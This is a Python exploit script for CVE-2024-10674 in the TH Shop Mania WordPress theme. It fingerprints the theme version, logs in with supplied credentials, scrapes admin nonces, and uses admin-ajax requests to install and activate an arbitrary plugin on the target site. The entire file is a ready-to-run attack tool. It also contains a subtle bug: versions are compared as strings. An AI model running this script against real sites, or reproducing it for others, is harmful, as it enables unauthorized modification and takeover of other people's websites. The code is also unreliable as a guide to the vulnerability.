import requests
import argparse
import re
import time

# By Nxploit | Khaled alenazi,


# Function to check if the site is vulnerable
def check_vulnerability(url):
    version_url = f"{url}/wp-content/themes/th-shop-mania/readme.txt"

    try:
        response = requests.get(version_url, timeout=5)
        if response.status_code == 200:
            match = re.search(r"Stable tag:\s*([0-9\.]+)", response.text)
            if match:
                version = match.group(1)
                print(f"[+] Detected theme version: {version}")
                if version <= "1.4.9":
                    print("[+] Site is vulnerable! Exploiting in 3 seconds...")
                    time.sleep(3)
                    return True
                else:
                    print("[-] Site is not vulnerable. Exiting.")
                    return False
            else:
                print("[-] Could not determine theme version. Exiting.")
                return False
        else:
            print("[-] Unable to retrieve readme.txt. Exiting.")
            return False
    except requests.RequestException:
        print("[-] Connection error while checking theme version. Exiting.")
        return False

# Function to ensure the URL has the correct format
def normalize_url(url):
    if not url.startswith(("http://", "https://")):
        print("[!] URL missing schema, adding 'http://'")
        return "http://" + url
    return url

# Argument Parser
parser = argparse.ArgumentParser(description="Exploit for CVE-2024-10674 (# By Nxploit | Khaled alenazi,)")
parser.add_argument("-u", "--url", required=True, help="Target WordPress URL (e.g., http://192.168.100.74:888/wordpress)")
parser.add_argument("-U", "--username", required=True, help="WordPress username")
parser.add_argument("-P", "--password", required=True, help="WordPress password")
parser.add_argument("-p", "--plugin", default="th-all-in-one-woo-cart", help="Plugin to install (default: All In One Woo Cart)")
args = parser.parse_args()

# Normalize URL
args.url = normalize_url(args.url)

# Check if the site is vulnerable
if not check_vulnerability(args.url):
    exit()

# Create session
session = requests.Session()

# Login
login_url = f"{args.url}/wp-login.php"
login_data = {
    "log": args.username,
    "pwd": args.password,
    "rememberme": "forever",
    "wp-submit": "Log In"
}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"}

response = session.post(login_url, data=login_data, headers=headers, verify=False)

if "wordpress_logged_in" in response.text or any("wordpress_logged_in" in cookie.name for cookie in session.cookies):
    print("[+] Logged in successfully!")
else:
    print("[-] Login failed. Check your credentials.")
    exit()

# Extract nonce for installation & activation from theme settings page
admin_page_url = f"{args.url}/wp-admin/themes.php?page=th_shop_mania_thunk_started"
admin_page = session.get(admin_page_url, headers=headers)
install_nonce_match = re.search(r'"ajax_nonce":"([a-f0-9]+)"', admin_page.text)
activate_nonce_match = re.search(r'"wpnonce":"([a-f0-9]+)"', admin_page.text)

if install_nonce_match:
    install_nonce = install_nonce_match.group(1)
    print(f"[+] Extracted installation nonce: {install_nonce}")
else:
    print("[-] Failed to extract installation nonce.")
    exit()

if activate_nonce_match:
    activate_nonce = activate_nonce_match.group(1)
    print(f"[+] Extracted activation nonce: {activate_nonce}")
else:
    print("[-] Failed to extract activation nonce.")
    exit()

# Plugin installation
install_url = f"{args.url}/wp-admin/admin-ajax.php"
plugin_slug = args.plugin.lower().replace(" ", "-")
plugin_path = f"{plugin_slug}/{plugin_slug}.php"

install_data = {
    "action": "install-plugin",
    "slug": plugin_slug,
    "init": plugin_path,
    "_ajax_nonce": install_nonce,
    "_fs_nonce": "",
    "username": "",
    "password": "",
    "connection_type": "",
    "public_key": "",
    "private_key": ""
}

install_response = session.post(install_url, data=install_data, headers=headers)
if '"success":true' in install_response.text:
    print(f"[+] Plugin '{plugin_slug}' installed successfully!")
else:
    print("[-] Plugin installation failed.")
    exit()

# Plugin activation using correct AJAX request
activate_data = {
    "action": "th_activeplugin",
    "init": plugin_path,
    "slug": plugin_slug,
    "nonce": activate_nonce
}

activate_response = session.post(install_url, data=activate_data, headers=headers)

if '"success":true' in activate_response.text:
    print(f"[+] Plugin '{plugin_slug}' activated successfully!")
else:
    # Debugging: Print the response for analysis 
    print("[-] Plugin activation failed. Debugging info:")
    print(activate_response.text)

# Ensure activation by checking active plugins
active_plugins_url = f"{args.url}/wp-admin/plugins.php"
active_plugins_page = session.get(active_plugins_url, headers=headers)

if plugin_slug in active_plugins_page.text:
    print(f"[+] Plugin '{plugin_slug}' is active.")
else:
    print(f"[-] Plugin '{plugin_slug}' is not active. Please check manually.")